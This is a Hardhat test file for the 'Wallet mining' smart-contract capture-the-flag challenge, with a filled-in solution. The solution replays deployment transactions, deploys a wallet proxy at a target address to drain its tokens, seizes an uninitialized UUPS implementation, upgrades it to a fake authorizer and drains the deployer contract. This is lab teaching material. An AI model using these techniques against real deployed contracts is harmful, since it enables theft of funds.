const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { Factory, Copy, Upgrade } = require("./deployment.json");
describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        console.log("aaaaaaa:",authorizer.address);
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let tx, res, deployer3;
        deployer3 = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        tx = {
          from: player.address,
          to: deployer3,
          value: ethers.utils.parseEther("1"),
        };
    
        await player.sendTransaction(tx);
    
        let DeployedFactory, deployedFactory, deployedCopy;
        deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
        console.log("MasterCopy deployed at", deployedCopy.contractAddress);
    
        await (await ethers.provider.sendTransaction(Upgrade)).wait();
    
        deployedFactory = await (
          await ethers.provider.sendTransaction(Factory)
        ).wait();
        console.log("Factory deployed at", deployedFactory.contractAddress);

        DeployedFactory = (
          await ethers.getContractFactory("GnosisSafeProxyFactory")
        ).attach(deployedFactory.contractAddress);
        let depositWallet, MockWallet, mockWallet;
        
        //Deploy mockWallet logic contract
        MockWallet = await ethers.getContractFactory("MockWallet");
        mockWallet = await MockWallet.deploy();
        console.log("MockWallet deployed at", mockWallet.address);
        //Deploy deposit wallet
        let functionData = MockWallet.interface.encodeFunctionData("attack", [
          token.address,
          player.address,
        ]);
        for (let i = 1; i < 45; i++) {
          if (i == 43) {
            console.log("Draining funds from Deposit Wallet");
            depositWallet = await DeployedFactory.createProxy(
              mockWallet.address,
              functionData
            ); 
            const hash = await depositWallet.hash;
            console.log("walletad --------------:  ",hash);
            const receipt = await ethers.provider.getTransactionReceipt(hash);
            console.log("log:",receipt);
          }
          depositWallet = await DeployedFactory.createProxy(mockWallet.address, []);
        }
        console.log(authorizer.address);
    
        /**Step 3: Take over Authorizer logic contract and upgrade it to fakeAuthorizer contract*/
        let imp = "0x" +  (await ethers.provider.getStorageAt(authorizer.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")).slice(-40);
        console.log("impaddress:",imp);
        const AuthorizerLogic = await ethers.getContractFactory(
          "AuthorizerUpgradeable"
        );
        const authorizerLogic = await AuthorizerLogic.attach(
          "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"
        );
        
        await authorizerLogic
          .connect(player)
          .init([], []);
        const FakeAuthorizer = await ethers.getContractFactory("FakeAuthorizer");
        const fakeAuthorizer = await FakeAuthorizer.deploy();
        console.log(fakeAuthorizer.address);
        console.log(walletDeployer.address);
        let abi = [`function attack()`];
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("attack", []);
    
        await authorizerLogic
          .connect(player)
          .upgradeToAndCall(fakeAuthorizer.address, data);
        console.log("Draining funds from Wallet Deployer");
        for (let i = 0; i < 43; i++) {
          await walletDeployer.connect(player).drop([]);
        }
        console.log(await token.balanceOf(player.address));
    
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
